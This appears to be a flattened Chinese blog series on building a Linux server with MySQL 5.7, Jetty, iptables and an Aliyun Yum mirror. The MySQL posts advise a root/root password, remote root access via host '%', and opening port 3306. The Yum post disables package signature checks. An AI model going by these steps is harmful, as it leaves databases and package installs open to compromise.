一份网上的调优配置123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596[client]user&#x3D;rootpassword&#x3D;root[mysqld]########basic settings########server-id &#x3D; 11port &#x3D; 3306user &#x3D; mysqlautocommit &#x3D; 0character_set_server&#x3D;utf8mb4#skip_name_resolve &#x3D; 1bind_address &#x3D; 127.0.0.1max_connections &#x3D; 800max_connect_errors &#x3D; 1000transaction_isolation &#x3D; READ-COMMITTEDexplicit_defaults_for_timestamp &#x3D; 1join_buffer_size &#x3D; 134217728tmp_table_size &#x3D; 67108864datadir &#x3D; &#x2F;usr&#x2F;local&#x2F;mysql&#x2F;datatmpdir &#x3D; &#x2F;usr&#x2F;local&#x2F;mysql&#x2F;tempmax_allowed_packet &#x3D; 16777216sql_mode &#x3D; &quot;STRICT_TRANS_TABLES,NO_ENGINE_SUBSTITUTION,NO_ZERO_DATE,NO_ZERO_IN_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER&quot;interactive_timeout &#x3D; 1800wait_timeout &#x3D; 1800read_buffer_size &#x3D; 16777216read_rnd_buffer_size &#x3D; 33554432sort_buffer_size &#x3D; 33554432########log settings########log_error &#x3D; &#x2F;usr&#x2F;local&#x2F;mysql&#x2F;data&#x2F;error.logslow_query_log &#x3D; 1slow_query_log_file &#x3D; &#x2F;usr&#x2F;local&#x2F;mysql&#x2F;data&#x2F;slow.loglog_queries_not_using_indexes &#x3D; 1log_slow_admin_statements &#x3D; 1log_slow_slave_statements &#x3D; 1log_throttle_queries_not_using_indexes &#x3D; 10expire_logs_days &#x3D; 90long_query_time &#x3D; 2min_examined_row_limit &#x3D; 100########replication settings########master_info_repository &#x3D; TABLErelay_log_info_repository &#x3D; TABLElog_bin &#x3D; bin.logsync_binlog &#x3D; 1gtid_mode &#x3D; onenforce_gtid_consistency &#x3D; 1log_slave_updatesbinlog_format &#x3D; rowrelay_log &#x3D; &#x2F;usr&#x2F;local&#x2F;mysql&#x2F;data&#x2F;relay.logrelay_log_recovery &#x3D; 1binlog_gtid_simple_recovery &#x3D; 1slave_skip_errors &#x3D; ddl_exist_errors########innodb settings########innodb_page_size &#x3D; 16384innodb_buffer_pool_size &#x3D; 6Ginnodb_buffer_pool_instances &#x3D; 8innodb_buffer_pool_load_at_startup &#x3D; 1innodb_buffer_pool_dump_at_shutdown &#x3D; 1innodb_lru_scan_depth &#x3D; 2000innodb_lock_wait_timeout &#x3D; 5innodb_io_capacity &#x3D; 4000innodb_io_capacity_max &#x3D; 8000innodb_flush_method &#x3D; O_DIRECTinnodb_file_format &#x3D; Barracudainnodb_file_format_max &#x3D; Barracudainnodb_log_group_home_dir &#x3D; &#x2F;usr&#x2F;local&#x2F;mysql&#x2F;redolog&#x2F;innodb_undo_directory &#x3D; &#x2F;usr&#x2F;local&#x2F;mysql&#x2F;undolog&#x2F;innodb_undo_logs &#x3D; 128#innodb_undo_tablespaces &#x3D; 3innodb_flush_neighbors &#x3D; 1innodb_log_file_size &#x3D; 4Ginnodb_log_buffer_size &#x3D; 16777216innodb_purge_threads &#x3D; 4innodb_large_prefix &#x3D; 1innodb_thread_concurrency &#x3D; 64innodb_print_all_deadlocks &#x3D; 1innodb_strict_mode &#x3D; 1innodb_sort_buffer_size &#x3D; 67108864########semi sync replication settings########plugin_dir&#x3D;&#x2F;usr&#x2F;local&#x2F;mysql&#x2F;lib&#x2F;pluginplugin_load &#x3D; &quot;rpl_semi_sync_master&#x3D;semisync_master.so;rpl_semi_sync_slave&#x3D;semisync_slave.so&quot;loose_rpl_semi_sync_master_enabled &#x3D; 1loose_rpl_semi_sync_slave_enabled &#x3D; 1loose_rpl_semi_sync_master_timeout &#x3D; 5000[mysqld-5.7]innodb_buffer_pool_dump_pct &#x3D; 40innodb_page_cleaners &#x3D; 4innodb_undo_log_truncate &#x3D; 1innodb_max_undo_log_size &#x3D; 2Ginnodb_purge_rseg_truncate_frequency &#x3D; 128binlog_gtid_simple_recovery&#x3D;1log_timestamps&#x3D;systemtransaction_write_set_extraction&#x3D;MURMUR32show_compatibility_56&#x3D;on","tags":[{"name":"Server","slug":"Server","permalink":"http://yoursite.com/tags/Server/"},{"name":"DataBase","slug":"DataBase","permalink":"http://yoursite.com/tags/DataBase/"},{"name":"MySQL","slug":"MySQL","permalink":"http://yoursite.com/tags/MySQL/"}]},{"title":"Hello Server(四):以MySQL初始化为主的一些坑坑坑坑","date":"2016-07-20T07:00:00.000Z","path":"2016/07/20/HelloServer以MySQL初始化为主的一些坑坑坑坑/","text":"MySQL的各种大坑在服务器的安装中，最容易出现的问题的就是数据库安装问题，一旦哪一步出现Error对于不了解数据库的人来讲，修复的成本是极其高的。本篇将把三个月里关于MySQL碰到的各种坑一一总结 数据库初始化完成了什么mysql初始化主要完成了四个数据库的创建和数据写入 12345| information_schema || mysql || performance_schema || sys | 其中对于操作者来说最重要的是mysql，里面存储着账号密码和权限等信息 5.7弃用的初始化命令在MySQL的5.7版本更换了初始化函数，使用旧版的初始化函数最关键的一个问题是 无法直接得到默认密码 以下是旧版初始化的提示信息 1234567[root@localhost mysql-5.7.13]# bin&#x2F;mysql_install_db --user&#x3D;mysql --basedir&#x3D;&#x2F;usr&#x2F;local&#x2F;mysql-5.7.13&#x2F; --datadir&#x3D;&#x2F;usr&#x2F;local&#x2F;mysql-5.7.13&#x2F;data2016-07-22 06:41:58 [WARNING] mysql_install_db is deprecated. Please consider switching to mysqld --initialize2016-07-22 06:42:01 [WARNING] The bootstrap log isn&#39;t empty:2016-07-22 06:42:01 [WARNING] 2016-07-22T13:41:58.037800Z 0 [Warning] --bootstrap is deprecated. Please consider using --initialize instead2016-07-22T13:41:58.038451Z 0 [Warning] Changed limits: max_open_files: 1024 (requested 5000)2016-07-22T13:41:58.038478Z 0 [Warning] Changed limits: table_open_cache: 431 (requested 2000) 默认密码在哪如果使用了旧版的初始化命令，可以去目录 1cat &#x2F;root&#x2F;.mysql_secret 下获得初始化密码 接入数据库的坑如果按照教程(一)至(三)正确的配置，应该不会出现问题，但是在我自己摸索的过程中，因为使用旧版初始化命令，还遇到了以下问题，但是部分无法复现 Table权限不足 user中host仅对localhost开放 防火墙没有开放端口:解决方案 Jetty服务器无法正常使用图像验证码:解决方案 Table权限不足由于我使用不同版本的命令进行了多次初始化，不知道最后怎么搞得默认的库都不具备正确的权限，使用了以下指令解决 123grant all privileges on *.* to root@localhost identified by &#39;root&#39;;flush privileges;&#x2F;&#x2F;MySQL&gt; grant 权限1,权限2,…权限n on 数据库名称.表名称 to 用户名@用户地址 identified by ‘连接口令’; user中host被改错由于我乱改默认数据库mysql中的user表哥，导致对应root账号的host错误，始终无法接入数据库 123use mysql;UPDATE user SET host&#x3D;&#39;localhost&#39; WHERE user.user&#x3D;&#39;root&#39;;&#x2F;&#x2F;这是恢复正确初始化后的默认值flush privileges; 如果想从本机(虚拟机Linux)以外的地址(实体机Mac上的数据库软件)接入数据库，也需要更改这里的host对应 1UPDATE user SET host&#x3D;&#39;%&#39; WHERE user.user&#x3D;&#39;root&#39;;&#x2F;&#x2F;允许任意值 不然仅能虚拟机自身的链接访问接入数据库 接入数据库的正确姿势通过以上错误总结，完成正确的数据库链接，需要注意以下条件的齐备 MySQL数据库正常运行 使用了正确的地址和账户密码 防火墙没有拦截请求 名为mysql的DATABASE中user表单host与user字段正确 登陆用户拥有正确的数据库权限 如果数据库因为各种问题出现了异常，一定要逐条检查以上五点","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"},{"name":"Net","slug":"Net","permalink":"http://yoursite.com/tags/Net/"},{"name":"Servlet","slug":"Servlet","permalink":"http://yoursite.com/tags/Servlet/"},{"name":"Server","slug":"Server","permalink":"http://yoursite.com/tags/Server/"},{"name":"DataBase","slug":"DataBase","permalink":"http://yoursite.com/tags/DataBase/"},{"name":"MySQL","slug":"MySQL","permalink":"http://yoursite.com/tags/MySQL/"},{"name":"Linux","slug":"Linux","permalink":"http://yoursite.com/tags/Linux/"}]},{"title":"Hello Server(三):服务器容器Jetty和开放防火墙","date":"2016-07-20T06:00:00.000Z","path":"2016/07/20/HelloServer服务器容器Jetty和开放防火墙/","text":"服务器容器Jetty数据库安装完毕后我们需要安装一个服务器容器以便于架设服务 服务器容器相关知识参考 下载同MySQL一样，Jetty可以使用wget下载，我采用的是8.1.19版本 123wget -O &#x2F;usr&#x2F;local&#x2F;jetty-8.1.19.tar.gz http:&#x2F;&#x2F;repo1.maven.org&#x2F;maven2&#x2F;org&#x2F;eclipse&#x2F;jetty&#x2F;jetty-distribution&#x2F;8.1.19.v20160209&#x2F;jetty-distribution-8.1.19.v20160209.tar.gz 解压缩和建立软连接1234[root@localhost local]# tar -xvf jetty-8.1.19.tar.gz[root@localhost local]# mv jetty-distribution-8.1.19.v20160209 jetty-8.1.19[root@localhost local]# ln -s jetty-8.1.19 jetty 建立work目录和启动由于Jetty本身是隐式的work目录参考这里 1234[root@localhost local]# cd jetty-8.1.19[root@localhost jetty-8.1.19]# mkdir work[root@localhost jetty-8.1.19]# java -jar start.jar 至此一切顺利的话，应该是启动成功，但是在折腾的过程中往往是不顺利的，遇到的一些坑将在[下章总结][] 防火墙开放端口服务器启动后在服务器内访问地址 127.0.0.1:8080 可以看到Jetty页面，但是在实体机器内通过服务器地址 192.168.133.130:8080 访问却提示无法打开页面,原因是由于 Linux服务器的防火墙默认并没有开放8080端口 Linux防火墙是什么Linux防火墙是一个叫做iptables的服务，其配置文件在 /etc/sysconfig/iptables 中 打开iptables12[root@localhost jetty]# vim &#x2F;etc&#x2F;sysconfig&#x2F;iptables 默认文本为 1234567891011121314# Firewall configuration written by system-config-firewall# Manual customization of this file is not recommended.*filter:INPUT ACCEPT [0:0]:FORWARD ACCEPT [0:0]:OUTPUT ACCEPT [0:0]-A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT-A INPUT -p icmp -j ACCEPT-A INPUT -i lo -j ACCEPT-A INPUT -m state --state NEW -m tcp -p tcp --dport 22 -j ACCEPT-A INPUT -j REJECT --reject-with icmp-host-prohibited-A FORWARD -j REJECT --reject-with icmp-host-prohibitedCOMMIT 开放8080和3306端口一般情况下各个端口的作用为 22: ssh端口 8080: web服务端口 3306: mysql端口 从默认文本中可以看出，22端口已经被默认允许进入，我们只需要照着写就可以 12345678910# Firewall configuration written by system-config-firewall....-A INPUT -m state --state NEW -m tcp -p tcp --dport 22 -j ACCEPT-A INPUT -m state --state NEW -m tcp -p tcp --dport 8080 -j ACCEPT-A INPUT -m state --state NEW -m tcp -p tcp --dport 3306 -j ACCEPT....COMMIT 保存退出后重启防火墙服务，新的配置文件才能生效 1234567&#x2F;&#x2F;这个是关闭防火墙指令[root@localhost jetty]# service iptables stop&#x2F;&#x2F;这个是启动指令[root@localhost jetty]# service iptables start&#x2F;&#x2F;这个是重启[root@localhost jetty]# service iptables restart 使用重启可以看到提示信息 123456[root@localhost jetty]# service iptables restartiptables: Setting chains to policy ACCEPT: filter [ OK ]iptables: Flushing firewall rules: [ OK ]iptables: Unloading modules: [ OK ]iptables: Applying firewall rules: [ OK ] iptables在讲什么iptables的前身叫ipfirewall （内核1.x时代）,这是一个作者从freeBSD上移植过来的，能够工作在内核当中的，对数据包进行检测的一款简易访问控制工具。任何流量在进入网卡之后需要经过5个链(或者叫关卡),这五个链也被称为五个钩子函数（hook functions）。 PREROUTING (路由前) INPUT (数据包流入口) FORWARD (转发管卡) OUTPUT(数据包出口) POSTROUTING（路由后） 任何一个数据包，只要经过本机，必将经过这五个链中的其中一个链。 123456789101112131415[root@www ~]# iptables-save# Generated by iptables-save v1.4.7 on Fri Jul 22 15:51:52 2011*filter &lt;&#x3D;&#x3D;星号开头的指的是表格，这里为 filter:INPUT ACCEPT [0:0] &lt;&#x3D;&#x3D;冒号开头的指的是链，这里使用了3个链INPUT FORWARD OUTPUT:FORWARD ACCEPT [0:0] &lt;&#x3D;&#x3D;三条内建链的政策都是 ACCEPT:OUTPUT ACCEPT [680:100461]-A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT &lt;&#x3D;&#x3D;针对 INPUT 的规则-A INPUT -p icmp -j ACCEPT-A INPUT -i lo -j ACCEPT &lt;&#x3D;&#x3D;这条很重要！针对本机内部接口开放！-A INPUT -p tcp -m state --state NEW -m tcp --dport 22 -j ACCEPT &lt;&#x3D;&#x3D;针对 22端口的 INPUT 的规则-A INPUT -j REJECT --reject-with icmp-host-prohibited-A FORWARD -j REJECT --reject-with icmp-host-prohibited &lt;&#x3D;&#x3D;针对 FORWARD 的规则COMMIT# Completed on Fri Jul 22 15:51:52 2011 参考文献 iptables详解","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"},{"name":"Net","slug":"Net","permalink":"http://yoursite.com/tags/Net/"},{"name":"Servlet","slug":"Servlet","permalink":"http://yoursite.com/tags/Servlet/"},{"name":"Server","slug":"Server","permalink":"http://yoursite.com/tags/Server/"},{"name":"DataBase","slug":"DataBase","permalink":"http://yoursite.com/tags/DataBase/"},{"name":"MySQL","slug":"MySQL","permalink":"http://yoursite.com/tags/MySQL/"},{"name":"Linux","slug":"Linux","permalink":"http://yoursite.com/tags/Linux/"}]},{"title":"Hello Server(二):数据库MySQL","date":"2016-07-19T10:00:00.000Z","path":"2016/07/19/HelloServer数据库MySQL/","text":"数据库MySQL数据库是最头疼的东西，折腾3次其中两次都是为了折腾它，主要是要注意两点 采用正确的初始化命令 配置正确的访问防火墙和授权策略 MySQL安装下载我是用的是5.7.13版本的MySQL，有两种安装方式，第一是用wget从网上下载 123wget -O &#x2F;usr&#x2F;local&#x2F;mysql-5.7.13.tar.gz http:&#x2F;&#x2F;cdn.mysql.com&#x2F;&#x2F;Downloads&#x2F;MySQL-5.7&#x2F;mysql-5.7.13-linux-glibc2.5-x86_64.tar.gz 但是这个国外的地址实在是下载着太慢了，所以我就用迅雷下好然后移动到了Linux里 解压缩解压缩到 /usr/local 下，注意不同的命令可能造成目录结果层级不同，总之保证 /usr/local/mysql-5.7.13/bin 这种结构即可 1234567&#x2F;&#x2F;1. 切换目录[root@localhost local]# cd &#x2F;usr&#x2F;local&#x2F;&#x2F;2. 解压缩[root@localhost local]# tar -xvf mysql-5.7.13.tar.gz&#x2F;&#x2F;3. 更改mysql目录名[root@localhost local]# mv mysql-5.7.13-linux-glibc2.5-x86_64 mysql-5.7.13 建立软连接为了访问方便，不用每次都带版本号，建立一个mysql的快捷方式 12[root@localhost local]# ln -s mysql-5.7.13 mysql MySQL初始化这个概念十分重要，由于在Mac版本时采用的是dmg的安装版，会因为没有初始化报一些错，最后虽然解决了，但是没明白引起错误的原因 添加mysql用户组为系统添加一个mysql用户分组以及mysql的用户，以便系统对数据库进行操作 1[root@localhost local]# useradd -r -M -s &#x2F;sbin&#x2F;nologin mysql 更改mysql目录的拥有者和分组这里采用 -R 递归的方式更改 1234567&#x2F;&#x2F;1. 更改软连接为mysql用户组的mysql用户[root@localhost local]# chown -R mysql.mysql .&#x2F;mysql&#x2F;&#x2F;2. 更改mysql目录为mysql用户组的mysql用户[root@localhost local]# chown -R mysql.mysql .&#x2F;mysql-5.7.13&#x2F;&#x2F;3. 更改mysql目录属于mysql用户组[root@localhost local]# chgrp -R mysql .&#x2F;mysql-5.7.13 初始化－－－－－－－－－非常非常重要的概念－－－－－－－－－－－－首先切换到mysql目录下 12[root@localhost local]# cd mysql-5.7.13 使用初始化指令 12[root@localhost mysql-5.7.13]# bin&#x2F;mysqld --initialize --user&#x3D;mysql --basedir&#x3D;&#x2F;usr&#x2F;local&#x2F;mysql-5.7.13&#x2F; --datadir&#x3D;&#x2F;usr&#x2F;local&#x2F;mysql-5.7.13&#x2F;data 第一，这里有些教程使用了 bin/mysql_install_db 命令，这个命令在mysql 5.7版本被弃用了，改为了 mysqld –initialize 如果使用错误的初始化指令可能会引起一些未知的BUG 第二，该命令最好在mysql目录下执行，因为如果不在此目录，脚本中有些命令根据相对路径寻址可能会找不到对应函数，造成初始化失败 该命令解析下来是以下内容 in/mysqld –initialize：执行初始化 –user=mysql：使用mysql用户进行初始化 –basedir=/usr/local/mysql-5.7.13/：mysql的基础目录是该地址 –datadir=/usr/local/mysql-5.7.13/data：mysql运行中产生的数据保存到这个data地址(不存在会新建文件夹) 初始化成功初始化成功会看到一些Warning信息以及一个 初始密码 1234562016-07-19T13:47:19.644607Z 0 [Warning] TIMESTAMP with implicit DEFAULT value is deprecated. Please use --explicit_defaults_for_timestamp server option (see documentation for more details).2016-07-19T13:47:19.827684Z 0 [Warning] InnoDB: New log files created, LSN&#x3D;457902016-07-19T13:47:19.865815Z 0 [Warning] InnoDB: Creating foreign key constraint system tables.2016-07-19T13:47:19.928363Z 0 [Warning] No existing UUID has been found, so we assume that this is the first time that this server has been started. Generating a new UUID: 5014f56a-4db7-11e6-89c4-000c29a4137c.2016-07-19T13:47:19.929152Z 0 [Warning] Gtid table is not ready to be used. Table &#39;mysql.gtid_executed&#39; cannot be opened.2016-07-19T13:47:19.929802Z 1 [Note] A temporary password is generated for root@localhost: 5N&#x3D;&gt;Qkolqg.L 最后一行表明初始密码为 5N=&gt;Qkolqg.L MySQL的配置配置文件和命令外移MySQL初始化成功后按说就可以使用了，但是最好先进行一些简单的配置 12345&#x2F;&#x2F;1. 首先把默认的配置文件设置给mysql，即etc目录下的my.cnf文件[root@localhost mysql-5.7.13]# cp -a .&#x2F;support-files&#x2F;my-default.cnf &#x2F;etc&#x2F;my.cnf&#x2F;&#x2F;2. 再把mysql.server的命令函数移动到系统级[root@localhost mysql-5.7.13]# cp -a .&#x2F;support-files&#x2F;mysql.server &#x2F;etc&#x2F;init.d&#x2F;mysql.server 进入安全模式和重启配置好之后，需要重启使新的配置生效，首先进入安全模式 12345[root@localhost mysql-5.7.13]# bin&#x2F;mysqld_safe --user&#x3D;mysql &amp;[1] 67153[root@localhost mysql-5.7.13]# 2016-07-19T13:49:39.678770Z mysqld_safe Logging to &#39;&#x2F;usr&#x2F;local&#x2F;mysql-5.7.13&#x2F;data&#x2F;localhost.localdomain.err&#39;.2016-07-19T13:49:39.707079Z mysqld_safe Starting mysqld daemon with databases from &#x2F;usr&#x2F;local&#x2F;mysql-5.7.13&#x2F;data 在安全模式下是看不到系统用户[root@localhost mysql-5.7.13]的，但是也可以输入指令，使用系统级的函数进行重启mysql 1234......2016-07-19T13:49:39.707079Z mysqld_safe Starting mysqld daemon with databases from &#x2F;usr&#x2F;local&#x2F;mysql-5.7.13&#x2F;data&#x2F;etc&#x2F;init.d&#x2F;mysql.server restart &#x2F;&#x2F;这一行是安全模式下需要输入的指令 顺利的话会看到提示信息 12345Shutting down MySQL..2016-07-19T13:50:10.002192Z mysqld_safe mysqld from pid file &#x2F;usr&#x2F;local&#x2F;mysql-5.7.13&#x2F;data&#x2F;localhost.localdomain.pid ended SUCCESS!Starting MySQL. SUCCESS![1]+ Done bin&#x2F;mysqld_safe --user&#x3D;mysql 设置mysql开机启动12[root@localhost mysql-5.7.13]# chkconfig --level 35 mysql.server on 更改初始密码MySQL的旧版本是不会生成初始密码的，从5.7才开始生成貌似，输入密码的时候是看不到光标的 123[root@localhost mysql-5.7.13]# bin&#x2F;mysql -uroot -pEnter password: 进入mysql程序，记得mysql的指令需要以分号结尾 12345678mysql&gt; SET PASSWORD&#x3D;PASSWORD(&#39;root&#39;);Query OK, 0 rows affected, 1 warning (0.00 sec)mysql&gt; flush privileges;Query OK, 0 rows affected (0.00 sec)mysql&gt; quitBye 由于密码改成了root，退出后就可以使用root root登陆了 初始化的时候没记住初始密码可以去路径下查看，不过有时候文件不存在，我也不知道为什么 12[root@localhost mysql-5.7.13]# cat &#x2F;root&#x2F;.mysql_secret 更改mysql命令为系统级在刚刚登陆mysql的时候，我们是在mysql的目录下使用 bin/mysql 登陆的，如果想在任意目录下使用mysql，需要在系统的环境变量里添加该路径 如果你是root用户，需要修改root下的.bashrc文件 123456[root@localhost &#x2F;]# cd root&#x2F;[root@localhost ~]# vim .bashrc[root@localhost ~]# source .bashrc[root@localhost ~]# echo $PATH&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;sbin:&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;root&#x2F;bin:&#x2F;root&#x2F;bin:&#x2F;usr&#x2F;local&#x2F;mysql&#x2F;bin 如果你不是root用户，也可以修改自己用户路径/home/用户名/…下的.bashrc文件，原理是一样的 .bashrc文件的修改打开.bashrc 后再最后最$PATH进行重新赋值 1234567891011121314151617# .bashrc# User specific aliases and functionsalias rm&#x3D;&#39;rm -i&#39;alias cp&#x3D;&#39;cp -i&#39;alias mv&#x3D;&#39;mv -i&#39;# Source global definitionsif [ -f &#x2F;etc&#x2F;bashrc ]; then . &#x2F;etc&#x2F;bashrcfiPATH&#x3D;$PATH:&#x2F;usr&#x2F;local&#x2F;mysql&#x2F;binexport PATH 两个.bash文件的区别(小知识，可以不看)进入命令行有2种方式，第一是login方式，比如ssh，第二个是non-login比如在图形界面下打开一个新的tab ~/.bash_profile:用户可使用该文件输入专用于自己使用的shell信息,当用户登录时,该文件仅仅执行一次！默认情况下,他设置一些环境变量,执行用户的 .bashrc 文件. ~/.bashrc:该文件包含专用于你的bash shell的bash信息,当登录时以及每次打开新的shell时,该文件被读取. 由于/.bash_profile login 方式进入bash 运行的，/.bashrc 是 non-login 方式进入bash 运行的，且profile会调用后者，所以建议修改后者","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"},{"name":"Net","slug":"Net","permalink":"http://yoursite.com/tags/Net/"},{"name":"Servlet","slug":"Servlet","permalink":"http://yoursite.com/tags/Servlet/"},{"name":"Server","slug":"Server","permalink":"http://yoursite.com/tags/Server/"},{"name":"DataBase","slug":"DataBase","permalink":"http://yoursite.com/tags/DataBase/"},{"name":"MySQL","slug":"MySQL","permalink":"http://yoursite.com/tags/MySQL/"},{"name":"Linux","slug":"Linux","permalink":"http://yoursite.com/tags/Linux/"}]},{"title":"Hello Server(一):服务器操作系统Linux & Yum换源 & Java","date":"2016-07-19T06:00:00.000Z","path":"2016/07/19/HelloServer服务器操作系统LinuxYumJava/","text":"Hello Server写了三四个月的管理服务平台终于说要上线，这个系列就是记载了怎么从零开始搭建一个Jetty＋MySQL的Java服务器系统 该文章是经过3次折腾后特定版本下的正确攻略，在错误的操作下会碰到的一些坑坑总结在了最后 阅读该文章之前要具备以下基础知识： Linux基础知识 命令行基本操作 Vim简单操作 Yum等包管理软件的基本操作 安装Linux首先搞一个Linux的镜像，比如RedHat或者CentOS的，我是从同事那里拷贝来的RedHat 6.7，使用的VMWare虚拟机，在装完系统之后导出成OVF文件，再导入公司的实体机。 更换Yum源由于国内Great FireWall 的原因以及RedHat版本的Yum是收费的等原因，需要将包管理工具Yum的源换成阿里云的镜像 下载配置1234567891011121314&#x2F;&#x2F;1. 切换到yum目录[root@localhost ~]# cd &#x2F;etc&#x2F;yum.repos.d&#x2F;&#x2F;&#x2F;2. 备份redhat的yum配置文件[root@localhost yum.repos.d]# cp rhel-source.repo rhel-source.repo.bak&#x2F;&#x2F;3. 从阿里云下载CentOS的源配置文件[root@localhost yum.repos.d]# wget -O &#x2F;etc&#x2F;yum.repos.d&#x2F;CentOS-Base.repo http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;repo&#x2F;Centos-6.repo.....&#x2F;&#x2F;4. 改成redhat的配置文件名，提问是否覆盖选yes[root@localhost yum.repos.d]# mv CentOS-Base.repo rhel-source.repo&#x2F;&#x2F;5. 使用Vim修改配置文件[root@localhost yum.repos.d]# vim rhel-source.repo 修改配置文件配置文件打开后有两点需要修改 关闭gpgcheck 修改$releasever相对路径为绝对路径 yum作为包管理工具原理同maven一样，所以说如果提示404找不到某某文件错误，就用网站打开url看一看在哪，配置文件节选 123456789101112131415161718192021222324252627[base]name&#x3D;CentOS-$releasever - Base - mirrors.aliyun.comfailovermethod&#x3D;prioritybaseurl&#x3D;http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;centos&#x2F;$releasever&#x2F;os&#x2F;$basearch&#x2F; http:&#x2F;&#x2F;mirrors.aliyuncs.com&#x2F;centos&#x2F;$releasever&#x2F;os&#x2F;$basearch&#x2F;#mirrorlist&#x3D;http:&#x2F;&#x2F;mirrorlist.centos.org&#x2F;?release&#x3D;$releasever&amp;arch&#x3D;$basearch&amp;repo&#x3D;osgpgcheck&#x3D;1gpgkey&#x3D;http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;centos&#x2F;RPM-GPG-KEY-CentOS-6#released updates[updates]......#additional packages that may be useful[extras]......#additional packages that extend functionality of existing packages[centosplus]......#contrib - packages by Centos Users[contrib]...... gpgcheck修改 gpgcheck=1 为 gpgcheck=0 ，关闭了某种钥匙检查 12345678[base]......gpgcheck&#x3D;0......[updates]...... $releasever修改 $releasever 为 6 ，而不是具体某版本比如 6.7，原因是yum源弃用了具体的小版本号，而是采用了大版本号 12345678910[base]......baseurl&#x3D;http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;centos&#x2F;6&#x2F;os&#x2F;$basearch&#x2F; http:&#x2F;&#x2F;mirrors.aliyuncs.com&#x2F;centos&#x2F;6&#x2F;os&#x2F;$basearch&#x2F;......[updates]...... 使用vim的替换命令如果你对vim熟悉，可以用s命令退换，不熟悉就手动改吧 1234:%s&#x2F;gpgcheck&#x3D;1&#x2F;gpgcheck&#x3D;0&#x2F;g:%s&#x2F;\\&#x2F;$releasever\\&#x2F;&#x2F;\\&#x2F;6\\&#x2F;&#x2F;g Yum安装JavaYum准备工作更改过Yum源之后需要通过重新建立缓存和更新等步骤获取到最新对Linux包文件 1234567&#x2F;&#x2F;1. 清理yum[root@localhost yum.repos.d]# yum clean all&#x2F;&#x2F;2. 重新建立yum缓存[root@localhost yum.repos.d]# yum makecache&#x2F;&#x2F;3. 更新yum[root@localhost yum.repos.d]# yum －y update 这些操作根据网速不同，耗时可能很久，我大概1M/s的下行速度，用了十几分钟 安装Java12345&#x2F;&#x2F;1. 查找带有java关键词的软件，可以看到很多，这一步可以不用[root@localhost yum.repos.d]# yum search java&#x2F;&#x2F;2. 选择Java版本安装，我用的是1.7[root@localhost yum.repos.d]# yum install java-1.7.0* 看到以下提示界面,提示可能根据你用的shell不同不一定是中文 12345678910111213141516171819202122232425262728依赖关系解决&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; 软件包 架构 版本 仓库 大小&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;正在安装: java-1.7.0-openjdk x86_64 1:1.7.0.101-2.6.6.4.el6_8 updates 26 M java-1.7.0-openjdk-demo x86_64 1:1.7.0.101-2.6.6.4.el6_8 updates 1.9 M java-1.7.0-openjdk-devel x86_64 1:1.7.0.101-2.6.6.4.el6_8 updates 9.5 M java-1.7.0-openjdk-javadoc noarch 1:1.7.0.101-2.6.6.4.el6_8 updates 16 M java-1.7.0-openjdk-src x86_64 1:1.7.0.101-2.6.6.4.el6_8 updates 39 M为依赖而安装: giflib x86_64 4.1.6-3.1.el6 base 37 k jpackage-utils noarch 1.7.5-3.16.el6 base 60 k lksctp-tools x86_64 1.0.10-7.el6 base 79 k pcsc-lite-libs x86_64 1.5.2-15.el6 base 28 k ttmkfdir x86_64 3.0.9-32.1.el6 base 43 k tzdata-java noarch 2016f-1.el6 updates 180 k xorg-x11-fonts-Type1 noarch 7.2-11.el6 base 520 